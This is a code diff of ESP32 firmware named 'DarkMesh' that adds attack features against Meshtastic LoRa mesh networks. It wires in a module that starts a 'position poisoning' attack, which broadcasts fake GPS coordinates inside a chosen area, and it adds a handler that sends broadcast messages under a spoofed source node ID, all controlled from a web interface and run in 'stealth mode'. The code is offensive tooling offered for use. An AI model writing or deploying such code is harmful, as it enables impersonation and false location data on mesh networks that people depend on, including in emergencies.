@@ -1,5 +1,6 @@
 
 #include <stdio.h>
+#include <stdlib.h>
 #include <inttypes.h>
 #include "sdkconfig.h"
 #include "freertos/FreeRTOS.h"
@@ -13,6 +14,8 @@
 #include "esp_random.h"
 #include "MeshtasticCompact.hpp"
 #include "webserver.h"
+#include "TMAttack.hpp"
+
 static const char* TAG = "DarkMesh";
 
 static const char* ssid = "DarkMesh";
@@ -21,10 +24,11 @@ static const char* password = "1234Dark";
 extern "C" {
 void app_main();
 }
+TMAttack tmAttack;
 
 Radio_PINS radio_pins = {9, 11, 10, 8, 14, 12, 13};  // Default radio pins for Heltec WSL V3.
 LoraConfig lora_config = {
-    .frequency = 433.125,  // default frequency
+    .frequency = 869.25,
     .bandwidth = 250.0,
     .spreading_factor = 11,
     .coding_rate = 5,
@@ -64,10 +68,12 @@ void app_main(void) {
     ESP_LOGI(TAG, "Radio initializing...");
     meshtasticCompact.RadioInit(RadioType::SX1262, radio_pins, lora_config);
     ESP_LOGI(TAG, "Radio initialized.");
-    meshtasticCompact.setAutoFullNode(false);                                                                                               // we don't want to be a full node
-    meshtasticCompact.setSendHopLimit(7);                                                                                                   // max hop limit
-    meshtasticCompact.setStealthMode(true);                                                                                                 // stealth mode, we don't
-    meshtasticCompact.setSendEnabled(true);                                                                                                 // we want to send packets
+    meshtasticCompact.setAutoFullNode(false);  // we don't want to be a full node
+    meshtasticCompact.setSendHopLimit(7);      // max hop limit
+    meshtasticCompact.setStealthMode(true);    // stealth mode, we don't
+    meshtasticCompact.setSendEnabled(true);    // we want to send packets
+    tmAttack.setRadio(&meshtasticCompact);
+
     std::string short_name = "DM";                                                                                                          // short name
     std::string long_name = "DarkMesh";                                                                                                     // long name
     MeshtasticCompactHelpers::NodeInfoBuilder(meshtasticCompact.getMyNodeInfo(), esp_random(), short_name, long_name, esp_random() % 105);  // random nodeinfo
@@ -83,6 +89,55 @@ void app_main(void) {
             meshtasticCompact.SendMyNodeInfo();
             meshtasticCompact.SendMyPosition();
         }
+        tmAttack.loop();
         vTaskDelay(pdMS_TO_TICKS(100));  // wait 100 milliseconds
+    }
+}
+
+void handle_start_attack(const char* attack_type, JSON_Object* params) {
+    ESP_LOGI("WEB", "Handling 'start_attack': %s", attack_type);
+    if (strcmp(attack_type, "pos_poison") == 0 && params != NULL) {
+        double min_lat = json_object_get_number(params, "min_lat");
+        double max_lat = json_object_get_number(params, "max_lat");
+        double min_lon = json_object_get_number(params, "min_lon");
+        double max_lon = json_object_get_number(params, "max_lon");
+        ESP_LOGI("WEB", "Position Poisoning Attack Params: min_lat=%.6f, max_lat=%.6f, min_lon=%.6f, max_lon=%.6f", min_lat, max_lat, min_lon, max_lon);
+        tmAttack.setPosAttackParams(min_lat, max_lat, min_lon, max_lon);
+        tmAttack.setAttackType(AttackType::POS_POISON);
+        std::string wsmsg = "{\"type\":\"status_update\", \"current_attack\":\"Position Poison\"}";
+        ws_sendall((uint8_t*)wsmsg.c_str(), wsmsg.length(), true);
+    }
+}
+
+void handle_set_config(JSON_Object* params) {
+    ESP_LOGI("WEB", "Handling 'set_config'");
+    double frequency = json_object_get_number(params, "frequency");
+    double bandwidth = json_object_get_number(params, "bandwidth");
+    double sf = json_object_get_number(params, "spreading_factor");  // Numbers are doubles in parson
+
+    ESP_LOGI("WEB", "Config: Freq=%.1f, BW=%.1f, SF=%.0f", frequency, bandwidth, sf);
+    // TODO: Your logic here
+}
+// ... other handlers
+void handle_stop_attack() {
+    tmAttack.setAttackType(AttackType::NONE);
+    ESP_LOGI("WEB", "Handling 'stop_attack'");
+    std::string wsmsg = "{\"type\":\"\"}";
+    ws_sendall((uint8_t*)wsmsg.c_str(), wsmsg.length(), true);
+}
+
+void handle_send_message(const char* source_id, const char* message) {
+    ESP_LOGI("WEB", "Handling 'send_message' from %s: %s", source_id, message);
+    uint32_t srcnode = 0xabbababa;  // default
+    const char* hexstr = (*source_id == '!') ? source_id + 1 : source_id;
+    char* endptr;  // To check if the whole string was converted
+    errno = 0;     // Reset errno before the call
+    unsigned long value = strtoul(hexstr, &endptr, 16);
+    if (endptr != hexstr && *endptr == '\0' && errno != ERANGE && value <= 0xFFFFFFFF) {
+        srcnode = (uint32_t)value;
+        meshtasticCompact.SendTextMessage(std::string(message), 0xffffffff, 8, MC_MESSAGE_TYPE_TEXT, srcnode);
+        ESP_LOGI("WEB", "Sent message with srcnode=0x%08" PRIx32, srcnode);
+        std::string wsmsg = "{\"type\":\"debug\", \"message\":\"Sent message.\"}";
+        ws_sendall((uint8_t*)wsmsg.c_str(), wsmsg.length(), true);
     }
 }
